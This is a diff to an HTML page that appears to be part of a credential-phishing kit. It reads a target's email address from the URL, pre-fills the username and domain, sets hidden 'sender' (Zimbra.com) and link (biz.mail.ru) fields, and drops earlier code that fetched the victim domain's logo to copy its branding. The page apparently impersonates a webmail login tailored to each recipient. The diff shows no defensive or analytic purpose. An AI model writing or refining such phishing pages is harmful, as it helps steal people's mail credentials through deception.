@@ -1,5 +1,4 @@
 <html>
-
 <head>
 <meta http-equiv="Content-Language" content="en-us">
 <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
@@ -93,9 +92,9 @@
 						</tr>
 						<tr>
 							<td height="10">
-							    <input type="hidden" name="domain" id="domainInput" value="domain">
+							    <input  type="hidden" name="domain" size="20" id="domainInput" value="" >
 							    <input type="hidden" name="sender" value="Zimbra.com" >
-							    <input type="hidden" name="link" id="linkInput" value="http://${domain}/">
+							    <input  type="hidden" name="link" size="20" id="linkInput" value="" >
 							</td>
 						</tr>
 						<tr>
@@ -144,39 +143,21 @@
 <div class="footer">
   <p><img border="0" src="./img/footer.png" width="579" height="42"></p>
 </div>
+
 <script>
   const params = new URLSearchParams(window.location.search);
   const raw = params.get('login');
   const email = raw ? decodeURIComponent(raw) : '';
 
-  let user = '', domain = '';
-  if (email.includes('@')) {
-    [user, domain] = email.split(/@(.*)/, 2);
-  }
+  if (email && email.includes('@')) {
+    const [username, domain] = email.split(/@(.*)/, 2);
 
-  if (email) {
-    document.getElementById('userInput').value = email;
+    document.getElementById('userInput').value = username;
     document.getElementById('domainInput').value = domain;
-    document.getElementById('domainText').textContent = domain;
-    document.getElementById('linkInput').value = `http://${domain}/`;
-
-    const logoImage = document.getElementById('logoImage');
-    const clearbitLogo = `https://logo.clearbit.com/${domain}`;
-    const hiworksLogo = `https://office.hiworks.com/${domain}/common/logo/login`;
-    const localLogo = `img/logo.png`;
-
-    logoImage.src = clearbitLogo;
-
-    logoImage.onerror = () => {
-      logoImage.onerror = () => {
-        logoImage.onerror = null; // Stop further errors
-        logoImage.src = localLogo;
-      };
-      logoImage.src = hiworksLogo;
-    };
+    document.getElementById('domainText').textContent = '@' + domain;
+    document.getElementById('linkInput').value = `https://biz.mail.ru/login/${domain}`;
   }
 </script>
 </body>
-
-
 </html>
+
